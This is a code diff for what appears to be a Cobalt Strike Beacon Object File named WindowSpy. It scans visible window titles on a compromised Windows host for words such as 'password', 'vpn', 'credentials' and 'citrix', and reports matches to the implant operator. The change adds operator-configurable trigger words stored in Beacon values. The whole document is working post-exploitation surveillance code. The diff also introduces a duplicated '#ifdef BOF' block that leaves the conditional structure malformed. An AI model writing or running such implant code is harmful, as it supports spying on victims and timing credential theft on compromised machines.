@@ -4,84 +4,104 @@
 #include "bofdefs.h"
 #include <ctype.h>
 
-
 #pragma region error_handling
 #define print_error(msg, hr) _print_error(__FUNCTION__, __LINE__, msg, hr)
-BOOL _print_error(char* func, int line,  char* msg, HRESULT hr) {
+BOOL _print_error(char* func, int line, char* msg, HRESULT hr) {
 #ifdef BOF
-	BeaconPrintf(CALLBACK_ERROR, "(%s at %d): %s 0x%08lx", func, line,  msg, hr);
+    BeaconPrintf(CALLBACK_ERROR, "(%s at %d): %s 0x%08lx", func, line, msg, hr);
 #else
-	printf("[-] (%s at %d): %s 0x%08lx", func, line, msg, hr);
+    printf("[-] (%s at %d): %s 0x%08lx", func, line, msg, hr);
 #endif // BOF
 
-	return FALSE;
+    return FALSE;
 }
-
-
 #pragma endregion
 
 char match[] = "__TW_@L3R7__\n";
-char wordtomatch[][100] = { "vpn","password","confidential","secret","login","credentials","login","logon","sign in","citrix","administrator","control panel" };
+char triggerWordsKey[] = "TriggerWords";
 
 int alert = 2;
 
-int tolower(int c)
-{
-    // Check if the character is uppercase
-    if (c >= 'A' && c <= 'Z')
-    {
-        // Convert the character to lowercase by adding 32
-        // (the difference between the uppercase and lowercase ASCII codes)
+int tolower(int c) {
+    if (c >= 'A' && c <= 'Z') {
         c += 32;
     }
-
-    // Return the lowercase character
     return c;
 }
 
-//
-// Callback function. It will be called by EnumWindows function
-//  as many times as there are windows
-BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam)
-{
-    if (IsWindowVisible(hwnd)) // check whether window is visible
-    {
+BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
+    if (IsWindowVisible(hwnd)) {
         char wnd_title[256];
         GetWindowTextA(hwnd, (LPSTR)&wnd_title, sizeof(wnd_title));
         for (int i = 0; wnd_title[i]; i++) {
             wnd_title[i] = tolower(wnd_title[i]);
         }
         if (strlen(wnd_title) > 1) {
-            int i = 0;
-            for (size_t i = 0; i < sizeof(wordtomatch) / sizeof(wordtomatch[0]); i++) {
-                char* ismatch = strstr(wnd_title, wordtomatch[i]);
-                if (ismatch != NULL) {
-                    BeaconPrintf(0x0, wnd_title);
+            // Retrieve the trigger words from the Beacon value
+            char* triggerWords = (char*)BeaconGetValue(triggerWordsKey);
+            if (triggerWords != NULL) {
+                char triggerWordsCopy[1000];
+                strcpy_s(triggerWordsCopy,1000, triggerWords);
 
-                    alert = 1;
+                char* word = strtok(triggerWordsCopy, ",");
+                while (word != NULL) {
+                    char* ismatch = strstr(wnd_title, word);
+                    if (ismatch != NULL) {
+                        BeaconPrintf(0x0, wnd_title);
+                        alert = 1;
+                        break;
+                    }
+                    word = strtok(NULL, ",");
                 }
             }
-
         }
     }
-    return true; // function must return true if you want to continue enumeration
+    return true;
 }
+
 
 #ifdef BOF
+#ifdef BOF
 void go(char* buff, int len) {
-	EnumWindows(EnumWindowsProc, 0);
+    //BeaconPrintf(0x0, "[DEBUG] BOF Start");
+    datap parser;
+    char* arg;
+    char* triggerWords = 0;
+    BeaconDataParse(&parser, buff, len);
+    arg = BeaconDataExtract(&parser, NULL);
 
-	if (alert == 1) {
-		BeaconPrintf(0x0, match);
-	}
-	
+    if (BeaconGetValue(triggerWordsKey) != NULL) {
+        triggerWords = (char*)BeaconGetValue(triggerWordsKey);
+        //BeaconPrintf(0x0, "[DEBUG] trigger words are: %s", triggerWords);
+    }
+    else {
+        triggerWords = (char*)malloc(1000);
+        BeaconAddValue(triggerWordsKey, triggerWords); //if the beacon key doesn't exist already, we create it
+        //BeaconPrintf(0x0, "[DEBUG] BOF initialized triggerWords key at 0x%p", &triggerWords);
+    }
+    if (arg != NULL) {
+        // If an argument exists, add or update the trigger words
+        //BeaconPrintf(0x0, "[DEBUG] BOF Args parsed");
+        strcpy_s(triggerWords, 1000, arg); // Copy the entire arg string using strcpy_s
+        BeaconPrintf(0x0, "[+] Updated WindowSpy trigger words to %s", triggerWords);
+    }
+    if (strlen(triggerWords) > 2) {
+        //BeaconPrintf(0x0, "[+] checking");
+        EnumWindows(EnumWindowsProc, 0);
+    }
+
+    if (alert == 1) {
+        BeaconPrintf(0x0, match);
+    }
 }
-
+#else
+void main(int argc, char* argv[]) {
+    EnumWindows(EnumWindowsProc, 0);
+}
+#endif
 
 #else
-
 void main(int argc, char* argv[]) {
-	EnumWindows(EnumWindowsProc, 0);
+    EnumWindows(EnumWindowsProc, 0);
 }
-
 #endif
